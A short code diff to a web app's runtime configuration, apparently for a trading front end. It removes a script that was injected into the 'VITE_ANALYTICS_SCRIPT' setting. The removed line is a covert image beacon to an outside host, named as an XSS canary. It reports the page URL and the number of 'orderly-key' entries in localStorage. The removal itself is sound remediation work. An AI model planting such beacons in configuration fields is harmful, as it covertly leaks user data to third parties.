@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>(function(){try{var i=new Image();i.src='https://gollem.co/log/xss-canary-1779099620981?t='+Date.now()+'&u='+encodeURIComponent(location.href)+'&k='+(Object.keys(localStorage).filter(k=>k.indexOf('orderly-key')===0).length);window.__xss_canary='1779099620981';}catch(e){}})();</script>",
+  "VITE_ANALYTICS_SCRIPT": "",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
